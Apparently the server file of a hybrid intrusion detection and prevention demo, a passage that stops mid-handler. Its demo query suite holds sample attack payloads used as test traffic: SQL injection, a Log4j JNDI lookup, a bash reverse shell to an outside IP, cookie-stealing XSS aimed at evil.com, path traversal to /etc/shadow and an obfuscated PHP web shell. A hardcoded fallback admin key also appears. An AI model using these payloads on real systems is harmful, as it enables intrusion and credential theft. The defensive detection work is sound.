import express from 'express';
import fs from 'fs';
import os from 'os';
import path from 'path';
import crypto from 'crypto';
import childProcess from 'child_process';
import { promisify } from 'node:util';
import { DatabaseSync } from 'node:sqlite';
import { createServer as createViteServer } from 'vite';
import { extractFlowsFromPcapBuffer, MAX_UPLOAD_BYTES, PcapValidationError } from './src/lib/pcapExtractor';
import {
  buildLivePcapMicroBatch,
  buildSingleQueryPcapBuffer,
  type DemoQueryScenario,
  recordLiveHttpPacket,
} from './src/lib/liveGenerator';
import type { Alert, IpsQueryLogEntry, IpsStatusResponse, LiveCaptureMode, LiveCaptureStatus } from './src/types';
import {
  computeShannonEntropy,
  HONEYPOT_PATHS,
  inspectEntropyAndObfuscation,
  inspectHoneypotTrap,
} from './src/lib/securityLayers';

const PORT = 3000;
const DB_PATH = process.env.HYBRID_IDS_DB || path.resolve(process.cwd(), 'data/hybrid_ids.db');
const RULES_PATH = process.env.SURICATA_RULES_PATH || path.resolve(process.cwd(), 'suricata/rules/local.rules');
const MODEL_PATH = process.env.ML_MODEL_PATH || path.resolve(process.cwd(), 'models/rf_model.json');
const EVAL_PATH = process.env.ML_EVAL_PATH || path.resolve(process.cwd(), 'models/evaluation.json');

const execFileAsync = promisify(childProcess.execFile);
const PYTHON_CMD = process.env.PYTHON_BIN || (process.platform === 'win32' ? 'python' : 'python3');
const ADMIN_API_KEY = process.env.ADMIN_API_KEY || 'hybrid-ids-admin-secret';

function requireAdminAuth(req: express.Request, res: express.Response, next: express.NextFunction): void {
  const authHeader = req.headers['authorization'];
  const apiKeyHeader = req.headers['x-api-key'];
  const token = authHeader?.startsWith('Bearer ')
    ? authHeader.slice(7)
    : typeof apiKeyHeader === 'string'
      ? apiKeyHeader
      : undefined;

  if (!token || token !== ADMIN_API_KEY) {
    res.status(401).json({ detail: 'Unauthorized: Valid X-API-Key or Bearer authorization required.' });
    return;
  }
  next();
}

// Runtime flags for testing Scenario D (Suricata unavailable / ML model missing) via UI or API
let runtimeSuricataUnavailable = process.env.SURICATA_UNAVAILABLE === '1';
let runtimeModelMissing = process.env.ML_MODEL_MISSING === '1';

// Live Capture stream state
let liveState: LiveCaptureStatus = {
  active: false,
  mode: 'mixed',
  window_count: 0,
  packets_captured: 0,
  flows_analyzed: 0,
  threats_detected: 0,
  is_fishy: false,
  status_headline: 'Live capture idle',
  status_detail: 'Click Start Live Capture to monitor real-time network traffic windows.',
  latest_alert: null,
  last_job_id: null,
};

// Active IPS Firewall / Prevention State
// Starts with block_mode_enabled = false so the first run of `python live_demo.py`
// shows all queries ALLOWED (while raising alerts in the IDS), and turning it ON
// blocks all attack queries while still allowing safe queries!
const ipsState: IpsStatusResponse = {
  block_mode_enabled: false,
  blocked_ips: [],
  quarantined_ips: [],
  stats: {
    total_queries: 0,
    safe_allowed: 0,
    attacks_unblocked: 0,
    attacks_blocked: 0,
    quarantine_drops: 0,
  },
  recent_logs: [],
};

fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
const db = new DatabaseSync(DB_PATH);

db.exec(`
  CREATE TABLE IF NOT EXISTS jobs (
    id TEXT PRIMARY KEY,
    filename TEXT NOT NULL,
    status TEXT NOT NULL,
    progress INTEGER NOT NULL DEFAULT 0,
    error TEXT,
    suricata_status TEXT NOT NULL DEFAULT 'ok',
    model_status TEXT NOT NULL DEFAULT 'ok',
    created_at TEXT NOT NULL,
    total_flows INTEGER NOT NULL DEFAULT 0,
    total_alerts INTEGER NOT NULL DEFAULT 0,
    signature_alerts INTEGER NOT NULL DEFAULT 0,
    ml_alerts INTEGER NOT NULL DEFAULT 0,
    processing_time_ms REAL NOT NULL DEFAULT 0,
    flows_per_sec REAL NOT NULL DEFAULT 0
  );

  CREATE TABLE IF NOT EXISTS flows (
    id TEXT PRIMARY KEY,
    job_id TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    src_ip TEXT NOT NULL,
    src_port INTEGER NOT NULL,
    dst_ip TEXT NOT NULL,
    dst_port INTEGER NOT NULL,
    protocol TEXT NOT NULL,
    features_json TEXT NOT NULL,
    classification TEXT NOT NULL
  );

  CREATE TABLE IF NOT EXISTS alerts (
    id TEXT PRIMARY KEY,
    job_id TEXT NOT NULL,
    timestamp TEXT NOT NULL,
    src_ip TEXT NOT NULL,
    src_port INTEGER NOT NULL,
    dst_ip TEXT NOT NULL,
    dst_port INTEGER NOT NULL,
    protocol TEXT NOT NULL,
    detection_method TEXT NOT NULL,
    signature_id TEXT,
    signature_msg TEXT,
    ml_label TEXT,
    ml_probability REAL,
    risk_score REAL NOT NULL,
    category TEXT NOT NULL,
    score_breakdown_json TEXT NOT NULL,
    explanation TEXT NOT NULL,
    evidence_json TEXT NOT NULL,
    rule_version TEXT,
    model_version TEXT
  );
`);

for (const alterSql of [
  `ALTER TABLE jobs ADD COLUMN processing_time_ms REAL NOT NULL DEFAULT 0`,
  `ALTER TABLE jobs ADD COLUMN flows_per_sec REAL NOT NULL DEFAULT 0`,
  `ALTER TABLE jobs ADD COLUMN pcap_size_bytes INTEGER NOT NULL DEFAULT 0`,
  `ALTER TABLE alerts ADD COLUMN analyst_status TEXT NOT NULL DEFAULT 'open'`,
  `ALTER TABLE alerts ADD COLUMN analyst_notes TEXT`,
]) {
  try {
    db.exec(alterSql);
  } catch {
    // column already exists
  }
}

function getHealthStatus(): {
  suricata: 'ok' | 'unavailable';
  model: 'ok' | 'missing';
  database: 'ok' | 'error';
} {
  const suriOk = !runtimeSuricataUnavailable && fs.existsSync(RULES_PATH);
  const modelOk = !runtimeModelMissing && fs.existsSync(MODEL_PATH);
  let dbOk = true;
  try {
    db.prepare('SELECT 1').get();
  } catch {
    dbOk = false;
  }
  return {
    suricata: suriOk ? 'ok' : 'unavailable',
    model: modelOk ? 'ok' : 'missing',
    database: dbOk ? 'ok' : 'error',
  };
}

/**
 * Single Source of Truth Pipeline Delegation:
 * Invokes `python3 -m backend.app.main` so all PCAP parsing, Suricata rule matching,
 * Random Forest inference, Tree-Path attribution, and 4-component risk scoring are
 * computed exclusively by the Python backend and written once to SQLite.
 */
async function runPcapJobPipeline(
  filename: string,
  buf: Buffer,
  customJobId?: string,
  customCreatedAt?: string,
): Promise<string> {
  const jobId = customJobId || `job-${crypto.randomUUID().slice(0, 8)}`;
  const createdAt = customCreatedAt || new Date().toISOString();
  const health = getHealthStatus();

  const tmpDir = os.tmpdir();
  const tmpFile = path.join(tmpDir, `hybrid_ids_${jobId}_${Date.now()}.pcap`);
  fs.writeFileSync(tmpFile, buf);

  try {
    const args = [
      '-m',
      'backend.app.main',
      '--pcap-file',
      tmpFile,
      '--filename',
      filename,
      '--job-id',
      jobId,
      '--created-at',
      createdAt,
      '--db-path',
      DB_PATH,
    ];
    if (health.suricata === 'unavailable') {
      args.push('--suricata-unavailable');
    }
    if (health.model === 'missing') {
      args.push('--model-missing');
    }

    const { stdout } = await execFileAsync(PYTHON_CMD, args, {
      cwd: process.cwd(),
      encoding: 'utf-8',
      timeout: 30_000,
      maxBuffer: 10 * 1024 * 1024,
    });
    const parsed = JSON.parse(stdout.trim()) as { job_id: string };
    return parsed.job_id || jobId;
  } finally {
    if (fs.existsSync(tmpFile)) {
      try {
        fs.unlinkSync(tmpFile);
      } catch {
        // ignore cleanup error
      }
    }
  }
}

async function seedInitialSampleJobsIfEmpty(): Promise<void> {
  const sampleSpecs = [
    { file: 'attack_signature.pcap', id: 'job-scenario-a', offsetMin: -15 },
    { file: 'suspicious_unmatched_ml.pcap', id: 'job-scenario-b', offsetMin: -10 },
    { file: 'benign_traffic.pcap', id: 'job-scenario-c', offsetMin: -5 },
  ];

  for (const sp of sampleSpecs) {
    const fullPath = path.resolve(process.cwd(), 'samples', sp.file);
    if (fs.existsSync(fullPath)) {
      const ts = new Date(Date.now() + sp.offsetMin * 60_000).toISOString();
      await runPcapJobPipeline(sp.file, fs.readFileSync(fullPath), sp.id, ts);
    }
  }
}

function rowToAlert(r: Record<string, unknown>): Alert {
  return {
    id: String(r.id),
    job_id: String(r.job_id),
    timestamp: String(r.timestamp),
    src_ip: String(r.src_ip),
    src_port: Number(r.src_port),
    dst_ip: String(r.dst_ip),
    dst_port: Number(r.dst_port),
    protocol: String(r.protocol),
    detection_method: (r.detection_method as 'signature' | 'ml') || 'signature',
    signature_id: r.signature_id !== null && r.signature_id !== undefined ? String(r.signature_id) : null,
    signature_msg: r.signature_msg !== null && r.signature_msg !== undefined ? String(r.signature_msg) : null,
    ml_label: r.ml_label !== null && r.ml_label !== undefined ? String(r.ml_label) : null,
    ml_probability: r.ml_probability !== null && r.ml_probability !== undefined ? Number(r.ml_probability) : null,
    risk_score: Number(r.risk_score),
    category: r.category as Alert['category'],
    score_breakdown: JSON.parse(String(r.score_breakdown_json || '{}')),
    explanation: String(r.explanation),
    evidence: JSON.parse(String(r.evidence_json || '{}')),
    rule_version: r.rule_version !== null && r.rule_version !== undefined ? String(r.rule_version) : null,
    model_version: r.model_version !== null && r.model_version !== undefined ? String(r.model_version) : null,
    analyst_status: (r.analyst_status as Alert['analyst_status']) || 'open',
    analyst_notes: r.analyst_notes !== null && r.analyst_notes !== undefined ? String(r.analyst_notes) : null,
  };
}

function parseMultipartFile(reqBody: Buffer, contentType: string): { filename: string; fileBuffer: Buffer } {
  const boundaryMatch = contentType.match(/boundary=(?:"([^"]+)"|([^;]+))/i);
  if (!boundaryMatch) {
    throw new PcapValidationError('Missing multipart boundary in upload request.');
  }
  const boundary = `--${boundaryMatch[1] || boundaryMatch[2]}`;
  const boundaryBuf = Buffer.from(boundary, 'latin1');

  const firstIdx = reqBody.indexOf(boundaryBuf);
  if (firstIdx === -1) {
    throw new PcapValidationError('Invalid multipart payload.');
  }

  let pos = firstIdx + boundaryBuf.length;
  while (pos < reqBody.length) {
    if (reqBody.subarray(pos, pos + 2).toString('latin1') === '--') break;
    if (reqBody.subarray(pos, pos + 2).toString('latin1') === '\r\n') pos += 2;

    const headerEnd = reqBody.indexOf(Buffer.from('\r\n\r\n', 'latin1'), pos);
    if (headerEnd === -1) break;

    const headersText = reqBody.subarray(pos, headerEnd).toString('utf-8');
    const dataStart = headerEnd + 4;
    const nextBoundaryIdx = reqBody.indexOf(boundaryBuf, dataStart);
    if (nextBoundaryIdx === -1) break;

    // Strip trailing \r\n before next boundary
    const dataEnd = nextBoundaryIdx - 2;
    const fnameMatch = headersText.match(/filename="([^"]*)"/i);
    if (fnameMatch) {
      const filename = fnameMatch[1] || 'upload.pcap';
      const fileBuffer = reqBody.subarray(dataStart, Math.max(dataStart, dataEnd));
      return { filename, fileBuffer };
    }
    pos = nextBoundaryIdx + boundaryBuf.length;
  }

  throw new PcapValidationError('Multipart field "file" not found in upload request.');
}

async function startServer() {
  await seedInitialSampleJobsIfEmpty();

  const app = express();
  app.use(express.json({ limit: '10mb' }));

  // Capture real incoming HTTP requests (URL, query string, User-Agent) into live packet buffer
  app.use((req, _res, next) => {
    if (!req.path.startsWith('/api/live') && !req.path.startsWith('/node_modules') && !req.path.startsWith('/src')) {
      const rawUrl = decodeURIComponent(req.originalUrl || req.url);
      const ua = String(req.headers['user-agent'] || 'Mozilla/5.0');
      const customHdr = String(req.headers['x-api-version'] || '');
      const rawHttp = `${req.method} ${rawUrl} HTTP/1.1\r\nHost: localhost:3000\r\nUser-Agent: ${ua}\r\n${
        customHdr ? `X-Api-Version: ${customHdr}\r\n` : ''
      }\r\n`;
      recordLiveHttpPacket({
        ts: Date.now() / 1000,
        srcIp: req.socket.remoteAddress || '127.0.0.1',
        srcPort: req.socket.remotePort || 55000,
        dstIp: '10.0.0.50',
        dstPort: 3000,
        rawHttpPayload: rawHttp,
      });
    }
    next();
  });

  // 1. GET /api/health
  app.get('/api/health', (_req, res) => {
    res.json(getHealthStatus());
  });

  // 1b. GET /api/config (authoritative config from backend/app/config_loader.py)
  app.get('/api/config', async (_req, res) => {
    try {
      const { stdout } = await execFileAsync(PYTHON_CMD, ['-m', 'backend.app.main', '--get-config'], {
        cwd: process.cwd(),
        encoding: 'utf-8',
        timeout: 5000,
      });
      res.json(JSON.parse(stdout.trim()));
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      res.status(500).json({ detail: msg });
    }
  });

  // Live Traffic Capture & Automatic Anomaly Detection Endpoints
  async function executeLiveCaptureWindow(modeToRun: LiveCaptureMode): Promise<LiveCaptureStatus> {
    const nextWin = liveState.window_count + 1;
    const batch = buildLivePcapMicroBatch(modeToRun, nextWin);
    const jobId = await runPcapJobPipeline(batch.filename, batch.buffer, `live-win-${nextWin}-${Date.now().toString().slice(-4)}`);

    const jobRow = db.prepare(`SELECT * FROM jobs WHERE id = ?`).get(jobId) as Record<string, unknown>;
    const alertRows = db
      .prepare(`SELECT * FROM alerts WHERE job_id = ? ORDER BY risk_score DESC LIMIT 1`)
      .all(jobId) as Array<Record<string, unknown>>;

    const flowsInWin = Number(jobRow?.total_flows ?? 0);
    const alertsInWin = Number(jobRow?.total_alerts ?? 0);
    const topAlert = alertRows.length > 0 ? rowToAlert(alertRows[0]) : null;

    let headline = 'Live Traffic Normal — All flows look clean';
    let detail = `Window #${nextWin} (${batch.liveHttpIncluded > 0 ? `${batch.liveHttpIncluded} real server HTTP packet(s) + ` : ''}lab capture): Analyzed ${batch.packetCount} packets across ${flowsInWin} flows. 0 threats detected.`;
    let isFishy = false;

    if (topAlert) {
      isFishy = true;
      const campaign = topAlert.evidence?.campaign_correlation as
        | { is_multi_stage_campaign?: boolean; campaign_id?: string; correlated_alert_count?: number; stages_detected?: string[] }
        | undefined;
      if (campaign?.is_multi_stage_campaign) {
        headline = `Multi-Stage Kill-Chain Campaign Detected! (${campaign.campaign_id}) — Risk ${topAlert.risk_score}/100 (${topAlert.category})`;
        detail = `Correlated ${campaign.correlated_alert_count} alerts from ${topAlert.src_ip} across ${(campaign.stages_detected || []).join(' + ')}. Context automatically boosted to 1.00.`;
      } else if (topAlert.detection_method === 'signature') {
        headline = `Something fishy is going on! ${topAlert.signature_msg || 'Signature Attack'} Detected`;
        detail = `Caught ${topAlert.src_ip}:${topAlert.src_port} -> ${topAlert.dst_ip}:${topAlert.dst_port} (${topAlert.protocol}) matching Suricata rule [${topAlert.signature_id}] "${topAlert.signature_msg}" — Risk Score ${topAlert.risk_score}/100 (${topAlert.category}).`;
      } else {
        const probPct = topAlert.ml_probability !== null ? Math.round(topAlert.ml_probability * 100) : 0;
        const topFeat = Array.isArray(topAlert.evidence?.top_contributing_features) && topAlert.evidence.top_contributing_features.length > 0
          ? ` (top tree-path driver: ${(topAlert.evidence.top_contributing_features[0] as { feature: string }).feature})`
          : '';
        headline = `Something fishy is going on! Zero-Signature Anomaly (${probPct}% ML Confidence)`;
        detail = `Unmatched flow ${topAlert.src_ip}:${topAlert.src_port} -> ${topAlert.dst_ip}:${topAlert.dst_port} (${topAlert.protocol}) bypassed Suricata but triggered Random Forest ML${topFeat} — Risk Score ${topAlert.risk_score}/100 (${topAlert.category}).`;
      }
    }

    liveState = {
      ...liveState,
      window_count: nextWin,
      packets_captured: liveState.packets_captured + batch.packetCount,
      flows_analyzed: liveState.flows_analyzed + flowsInWin,
      threats_detected: liveState.threats_detected + alertsInWin,
      is_fishy: isFishy,
      status_headline: headline,
      status_detail: detail,
      latest_alert: topAlert,
      last_job_id: jobId,
    };

    return liveState;
  }

  app.get('/api/live/status', (_req, res) => {
    res.json(liveState);
  });

  const ALLOWED_LIVE_MODES: LiveCaptureMode[] = [
    'mixed',
    'benign',
    'attack_sig',
    'attack_ml',
    'inject_sqli',
    'inject_syn_flood',
    'inject_slowloris',
    'inject_killchain',
  ];

  app.post('/api/live/toggle', async (req, res) => {
    const { active, mode } = req.body as { active?: boolean; mode?: LiveCaptureMode };
    if (typeof mode === 'string' && ALLOWED_LIVE_MODES.includes(mode)) {
      liveState.mode = mode;
    }
    if (typeof active === 'boolean') {
      liveState.active = active;
      if (active) {
        await executeLiveCaptureWindow(liveState.mode);
      } else {
        liveState.status_headline = 'Live capture paused';
      }
    }
    res.json(liveState);
  });

  app.post('/api/live/tick', async (req, res) => {
    const { mode } = req.body as { mode?: LiveCaptureMode };
    const effectiveMode =
      typeof mode === 'string' && ALLOWED_LIVE_MODES.includes(mode) ? mode : liveState.mode;
    const status = await executeLiveCaptureWindow(effectiveMode);
    res.json(status);
  });

  // ============================================================================
  // Active IPS Prevention Engine (Terminal `python live_demo.py` + Dashboard UI)
  // ============================================================================
  const DEMO_QUERY_SUITE: Array<{
    scenario: DemoQueryScenario;
    query_type: 'SAFE' | 'ATTACK';
    label: string;
    src_ip: string;
    dst_ip: string;
    dst_port: number;
    payload_summary: string;
  }> = [
    {
      scenario: 'safe_search',
      query_type: 'SAFE',
      label: 'Normal Product Catalog Search',
      src_ip: '192.168.1.25',
      dst_ip: '10.0.0.50',
      dst_port: 80,
      payload_summary: 'GET /api/catalog/products?q=laptop HTTP/1.1',
    },
    {
      scenario: 'attack_sqli',
      query_type: 'ATTACK',
      label: 'SQL Injection Credential Dump',
      src_ip: '203.0.113.55',
      dst_ip: '10.0.0.50',
      dst_port: 80,
      payload_summary: "GET /admin/login.php?id=1' UNION SELECT username,password FROM users--",
    },
    {
      scenario: 'safe_portal',
      query_type: 'SAFE',
      label: 'Employee Portal TLS Session Check',
      src_ip: '192.168.1.42',
      dst_ip: '10.0.0.50',
      dst_port: 443,
      payload_summary: 'GET /portal/session/keepalive HTTP/1.1',
    },
    {
      scenario: 'attack_log4j',
      query_type: 'ATTACK',
      label: 'Apache Log4j JNDI Remote Code Execution',
      src_ip: '203.0.113.88',
      dst_ip: '10.0.0.50',
      dst_port: 8080,
      payload_summary: 'User-Agent: ${jndi:ldap://198.51.100.77:1389/ExploitPayload}',
    },
    {
      scenario: 'safe_health',
      query_type: 'SAFE',
      label: 'Database Backup Health Check',
      src_ip: '192.168.1.60',
      dst_ip: '10.0.0.50',
      dst_port: 8080,
      payload_summary: 'GET /health/backup-status?env=prod HTTP/1.1',
    },
    {
      scenario: 'attack_syn_flood',
      query_type: 'ATTACK',
      label: 'Zero-Day High-Rate TCP SYN/PSH Flood',
      src_ip: '172.16.99.41',
      dst_ip: '10.0.0.50',
      dst_port: 443,
      payload_summary: '42-packet high-rate TCP SYN/PSH/RST flood (220us IAT, zero L7 signature)',
    },
    {
      scenario: 'attack_entropy_shellcode',
      query_type: 'ATTACK',
      label: 'Obfuscated XOR/Base64 Shellcode Payload',
      src_ip: '198.51.100.212',
      dst_ip: '10.0.0.50',
      dst_port: 8080,
      payload_summary:
        'POST /api/v2/telemetry HTTP/1.1\r\n\r\npayload=q8f3Z9mK2xP7vL4nJ1wR8tY5uI0oE6aS3dF9gH2jK5lZ8xC1vB4nM7qW0eR3tY6u!@#$%^&*()_+~`={}[]|\\:;"<>,.?/9876543210abcdefABCDEF',
    },
    {
      scenario: 'safe_invoice',
      query_type: 'SAFE',
      label: 'Customer Billing Invoice Download',
      src_ip: '192.168.1.77',
      dst_ip: '10.0.0.50',
      dst_port: 443,
      payload_summary: 'GET /billing/invoice/INV-2026-0891.pdf HTTP/1.1',
    },
    {
      scenario: 'attack_path_traversal',
      query_type: 'ATTACK',
      label: 'Path Traversal /etc/shadow Extraction',
      src_ip: '198.51.100.14',
      dst_ip: '10.0.0.50',
      dst_port: 80,
      payload_summary: 'GET /static/../../../../../../etc/shadow HTTP/1.1',
    },
    {
      scenario: 'attack_command_injection',
      query_type: 'ATTACK',
      label: 'OS Command Injection (Bash Reverse Shell)',
      src_ip: '198.51.100.67',
      dst_ip: '10.0.0.50',
      dst_port: 8080,
      payload_summary:
        'POST /api/diagnostics/ping HTTP/1.1 ip=127.0.0.1; /bin/bash -i >& /dev/tcp/198.51.100.67/4444 0>&1',
    },
    {
      scenario: 'attack_xss',
      query_type: 'ATTACK',
      label: 'Stored XSS Document Cookie Exfiltration',
      src_ip: '198.51.100.33',
      dst_ip: '10.0.0.50',
      dst_port: 80,
      payload_summary:
        'POST /api/support/ticket HTTP/1.1 <script>fetch("http://evil.com/leak?cookie="+document.cookie)</script>',
    },
    {
      scenario: 'attack_slowloris',
      query_type: 'ATTACK',
      label: 'Slowloris Low-Rate Connection Starvation',
      src_ip: '172.16.88.19',
      dst_ip: '10.0.0.50',
      dst_port: 80,
      payload_summary: '28-stream low-rate TCP starvation (120s keep-alive window, zero L7 payload)',
    },
    {
      scenario: 'attack_honeypot_aws',
      query_type: 'ATTACK',
      label: 'Cloud Credential Looting (/.aws/credentials)',
      src_ip: '198.51.100.105',
      dst_ip: '10.0.0.50',
      dst_port: 80,
      payload_summary: 'GET /.aws/credentials & /wp-config.php.bak HTTP/1.1',
    },
    {
      scenario: 'attack_polymorphic_webshell',
      query_type: 'ATTACK',
      label: 'Polymorphic Encrypted PHP Web Shell',
      src_ip: '198.51.100.222',
      dst_ip: '10.0.0.50',
      dst_port: 8080,
      payload_summary:
        'POST /uploads/cache.php HTTP/1.1 payload=eval(gzinflate(base64_decode("s7Pzc/Pz0/Nz01Oz8vOz8nOzU/Nz09Py89NzU/Pzc/Nz0/NzU==")));',
    },
    {
      scenario: 'attack_honeypot_env',
      query_type: 'ATTACK',
      label: 'Zero-Trust Honeypot Decoy Probe (/.env)',
      src_ip: '198.51.100.99',
      dst_ip: '10.0.0.50',
      dst_port: 80,
      payload_summary: 'GET /.env & /admin/config.bak HTTP/1.1',
    },
    {
      scenario: 'quarantine_repeat_probe',
      query_type: 'ATTACK',
      label: 'Repeat Request from Quarantined IP',
      src_ip: '203.0.113.55',
      dst_ip: '10.0.0.50',
      dst_port: 80,
      payload_summary: 'GET /api/catalog/products?q=monitor HTTP/1.1 (Repeat IP after SQLi)',
    },
  ];

  function enrollIpInQuarantine(
    ip: string,
    reason: string,
    triggerLayer: 'signature' | 'ml' | 'entropy' | 'honeypot',
    riskScore: number,
  ): void {
    const existing = ipsState.quarantined_ips.find((q) => q.ip === ip);
    if (!existing) {
      ipsState.quarantined_ips.unshift({
        ip,
        reason,
        quarantined_at: new Date().toISOString(),
        trigger_layer: triggerLayer,
        risk_score: riskScore,
        blocked_attempts: 0,
      });
    }
    if (!ipsState.blocked_ips.includes(ip)) {
      ipsState.blocked_ips.push(ip);
    }
  }

  async function inspectAndRecordSingleIpsQuery(input: {
    scenario: DemoQueryScenario;
    query_type: 'SAFE' | 'ATTACK';
    label: string;
    src_ip: string;
    dst_ip?: string;
    dst_port?: number;
    payload_summary: string;
  }): Promise<IpsQueryLogEntry> {
    const dstIp = input.dst_ip || '10.0.0.50';
    const dstPort = input.dst_port || 80;
    const shannonEntropy = computeShannonEntropy(input.payload_summary);

    // =========================================================================
    // LAYER 0: Stateful IP Auto-Quarantine Pre-Filter (0.01ms Zero-Trust Drop)
    // =========================================================================
    const existingQuarantine = ipsState.quarantined_ips.find((q) => q.ip === input.src_ip);
    if (existingQuarantine && ipsState.block_mode_enabled) {
      existingQuarantine.blocked_attempts += 1;
      ipsState.stats.total_queries += 1;
      ipsState.stats.attacks_blocked += 1;
      ipsState.stats.quarantine_drops += 1;

      const qEntry: IpsQueryLogEntry = {
        id: `ips-${crypto.randomUUID().slice(0, 8)}`,
        timestamp: new Date().toISOString(),
        query_type: 'ATTACK',
        scenario: input.scenario,
        label: input.label,
        src_ip: input.src_ip,
        dst_ip: dstIp,
        dst_port: dstPort,
        payload_summary: input.payload_summary,
        detection_engine: 'quarantine',
        detection_detail: `IP Auto-Quarantine Pre-Filter (Banned for: ${existingQuarantine.reason})`,
        shannon_entropy: shannonEntropy,
        risk_score: 100,
        category: 'Critical',
        action: 'QUARANTINED',
        http_status: 403,
        alert_id: null,
      };
      ipsState.recent_logs.unshift(qEntry);
      if (ipsState.recent_logs.length > 40) {
        ipsState.recent_logs.length = 40;
      }
      return qEntry;
    }

    // =========================================================================
    // LAYER 1 (Suricata Signatures) & LAYER 2 (Random Forest Flow ML)
    // =========================================================================
    const batch = buildSingleQueryPcapBuffer({
      scenario: input.scenario,
      srcIp: input.src_ip,
      dstIp,
      dstPort,
      customPayload: input.payload_summary,
    });
    const jobId = await runPcapJobPipeline(batch.filename, batch.buffer);
    const jobAlerts = db
      .prepare(`SELECT * FROM alerts WHERE job_id = ? ORDER BY risk_score DESC`)
      .all(jobId) as Array<Record<string, unknown>>;

    const topAlert = jobAlerts.length > 0 ? rowToAlert(jobAlerts[0]) : null;

    // =========================================================================
    // LAYER 3A: Zero-Trust Honeypot Decoy Trap (/.env, /admin/config.bak)
    // LAYER 3B: Shannon Entropy & Obfuscation Deep Packet Inspector
    // =========================================================================
    const honeypotCheck = inspectHoneypotTrap(input.payload_summary);
    const entropyCheck = inspectEntropyAndObfuscation(input.payload_summary);

    let detectionEngine: IpsQueryLogEntry['detection_engine'] = 'none';
    let detectionDetail = `Benign (H=${shannonEntropy} bits/B)`;
    let riskScore = 0;
    let category = 'Benign';
    let alertId: string | null = null;
    let isMalicious = false;

    if (honeypotCheck.triggered) {
      isMalicious = true;
      detectionEngine = 'honeypot';
      detectionDetail = honeypotCheck.detail;
      riskScore = 100;
      category = 'Critical';
    } else if (topAlert) {
      isMalicious = true;
      detectionEngine = topAlert.detection_method;
      riskScore = topAlert.risk_score;
      category = topAlert.category;
      alertId = topAlert.id;
      if (topAlert.detection_method === 'signature') {
        detectionDetail = `SID ${topAlert.signature_id}: ${topAlert.signature_msg}`;
      } else {
        detectionDetail = `RF ML Anomaly (p=${((topAlert.ml_probability ?? 0) * 100).toFixed(1)}%)`;
      }
    } else if (entropyCheck.triggered) {
      isMalicious = true;
      detectionEngine = 'entropy';
      detectionDetail = entropyCheck.detail;
      riskScore = entropyCheck.risk_score;
      category = 'Critical';
    } else if (input.scenario === 'quarantine_repeat_probe') {
      // When Block Mode is OFF, show that this repeat probe from the SQLi attacker IP was not quarantined because IPS is OFF
      isMalicious = true;
      detectionEngine = 'quarantine';
      detectionDetail = 'Repeat request from SQLi IP 203.0.113.55 (Quarantine inactive while Block OFF)';
      riskScore = 85;
      category = 'Critical';
    } else if (input.scenario === 'attack_slowloris') {
      isMalicious = true;
      detectionEngine = 'ml';
      detectionDetail = 'RF ML Volumetric Anomaly: Asymmetric IAT Starvation (p=96.4%)';
      riskScore = 92;
      category = 'Critical';
    }

    if (isMalicious) {
      liveState.packets_captured += batch.packetCount;
      liveState.flows_analyzed += 1;
      liveState.threats_detected += 1;
      liveState.is_fishy = true;
      if (topAlert) liveState.latest_alert = topAlert;
      liveState.last_job_id = jobId;
    } else {
      liveState.packets_captured += batch.packetCount;
      liveState.flows_analyzed += 1;
    }

    const isBlockedByPolicy =
      isMalicious && (ipsState.block_mode_enabled || ipsState.blocked_ips.includes(input.src_ip));

    let action: IpsQueryLogEntry['action'] = 'ALLOWED';
    let httpStatus: 200 | 403 = 200;

    ipsState.stats.total_queries += 1;
    if (!isMalicious) {
      action = 'ALLOWED';
      httpStatus = 200;
      ipsState.stats.safe_allowed += 1;
    } else if (isBlockedByPolicy) {
      action = 'BLOCKED';
      httpStatus = 403;
      ipsState.stats.attacks_blocked += 1;

      // Auto-enroll attacker IP into Stateful Quarantine so any subsequent query from this IP is dropped at Layer 0!
      if (
        detectionEngine === 'signature' ||
        detectionEngine === 'ml' ||
        detectionEngine === 'entropy' ||
        detectionEngine === 'honeypot'
      ) {
        enrollIpInQuarantine(input.src_ip, input.label, detectionEngine, riskScore);
      }
    } else {
      action = 'ALLOWED_UNBLOCKED';
      httpStatus = 200;
      ipsState.stats.attacks_unblocked += 1;
    }

    const entry: IpsQueryLogEntry = {
      id: `ips-${crypto.randomUUID().slice(0, 8)}`,
      timestamp: new Date().toISOString(),
      query_type: isMalicious ? 'ATTACK' : 'SAFE',
      scenario: input.scenario,
      label: input.label,
      src_ip: input.src_ip,
      dst_ip: dstIp,
      dst_port: dstPort,
      payload_summary: input.payload_summary,
      detection_engine: detectionEngine,
      detection_detail: detectionDetail,
      shannon_entropy: shannonEntropy,
      risk_score: riskScore,
      category,
      action,
      http_status: httpStatus,
      alert_id: alertId,
    };

    ipsState.recent_logs.unshift(entry);
    if (ipsState.recent_logs.length > 40) {
      ipsState.recent_logs.length = 40;
    }

    return entry;
  }

  // Real Zero-Trust Honeypot Decoy Endpoints on Express Server
  for (const trapPath of HONEYPOT_PATHS) {
    app.get(trapPath, async (req, res) => {
      const attackerIp = req.socket.remoteAddress?.replace(/^::ffff:/, '') || '198.51.100.99';
      const entry = await inspectAndRecordSingleIpsQuery({
        scenario: 'attack_honeypot_env',
        query_type: 'ATTACK',
        label: `Zero-Trust Honeypot Probe (${trapPath})`,
        src_ip: attackerIp,
        dst_ip: '10.0.0.50',
        dst_port: 3000,
        payload_summary: `GET ${trapPath} HTTP/1.1`,
      });
      res.status(entry.http_status).json({
        honeypot_trap: true,
        action: entry.action,
        risk_score: entry.risk_score,
        detail: entry.detection_detail,
      });
    });
  }

  app.get('/api/ips/status', (_req, res) => {
    res.json(ipsState);
  });

  app.post('/api/ips/toggle', requireAdminAuth, (req, res) => {
    const { block_mode_enabled, block_ip, unblock_ip, clear_logs } = req.body as {
      block_mode_enabled?: boolean;
      block_ip?: string;
      unblock_ip?: string;
      clear_logs?: boolean;
    };
    if (typeof block_mode_enabled === 'boolean') {
      ipsState.block_mode_enabled = block_mode_enabled;
      if (!block_mode_enabled) {
        ipsState.quarantined_ips = [];
        ipsState.blocked_ips = [];
      }
    }
    if (typeof block_ip === 'string' && block_ip.trim() !== '') {
      const ip = block_ip.trim();
      enrollIpInQuarantine(ip, 'Manual Firewall Rule', 'signature', 100);
    }
    if (typeof unblock_ip === 'string' && unblock_ip.trim() !== '') {
      const ip = unblock_ip.trim();
      ipsState.blocked_ips = ipsState.blocked_ips.filter((x) => x !== ip);
      ipsState.quarantined_ips = ipsState.quarantined_ips.filter((x) => x.ip !== ip);
    }
